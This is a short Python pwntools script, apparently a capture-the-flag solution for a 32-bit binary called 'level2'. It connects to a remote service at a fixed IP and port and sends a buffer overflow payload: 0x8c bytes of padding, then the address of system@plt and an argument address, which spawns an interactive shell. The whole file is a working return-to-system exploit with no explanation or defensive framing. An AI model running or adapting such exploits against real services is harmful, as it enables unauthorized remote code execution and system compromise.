from pwn import *
sh = remote('111.198.29.45',43911)
#sh = process('./level2')
elf = ELF('./level2')
elf_system = elf.plt['system']
#pop_esi_edi_ebp = 0x080482de

payload = flat(['a'*0x8c , elf_system , 0xdeadbeef,0x804A024])
sh.sendline(payload)
sh.interactive()
